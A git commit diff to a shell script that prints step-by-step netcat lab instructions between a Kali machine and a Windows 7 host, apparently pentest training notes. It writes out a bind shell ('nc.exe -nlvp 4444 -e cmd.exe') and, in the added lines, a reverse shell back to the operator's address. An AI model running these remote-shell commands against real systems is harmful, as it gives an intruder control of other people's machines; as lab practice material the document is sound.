987a362f1882e54ea3fffa3f7c5439ad2b485fe0
Liberty0day <liberty188888@gmail.com>
2022-02-17 22:38:03 +0100

    up sujet 1

--- DNA_DB/SUJET_1/sujet_1.sh
+++ DNA_DB/SUJET_1/sujet_1.sh
@@ -1,18 +1,21 @@
 echo '
---] BIND SHELL
+--] BIND SHELL 8
 
-OSCAR      === KALI
-TANGO      === WINDOWS 7
+OPERATOR   === KALI         IP === 132
+TANGO      === WINDOWS 7    IP === 134
 
-OSCAR      ==> TASK ==> cd /usr/share/windows-binaries
-OSCAR      ==> TASK ==> python -m SimpleHTTPServer 80
-TANGO      ==> TASK ==> open iexplorer at http://IP_OSCAR/
+OPERATOR   ==> TASK ==> cd /usr/share/windows-binaries
+OPERATOR   ==> TASK ==> python -m SimpleHTTPServer 80
+TANGO      ==> TASK ==> open iexplorer at http://IP_OPERATOR/
 TANGO      ==> TASK ==> take nc.exe
 TANGO      ==> TASK ==> cmd.exe
 TANGO      ==> TASK ==> cd Download
 TANGO      ==> TASK ==> explorer .
 TANGO      ==> TASK ==> nc.exe -nlvp 4444 -e cmd.exe
-OSCAR      ==> TASK ==> nc -nv IP_TANGO 4444
-
+OPERATOR   ==> TASK ==> nc -nv IP_TANGO 4444
+OPERATOR   ==> TASK ==> nc -lvp 4444
+TANGO      ==> TASK ==> cmd.exe
+TANGO      ==> TASK ==> nc.exe -nv IP_OPERATOR 4444 -e cmd.exe
 '
 read
+clear
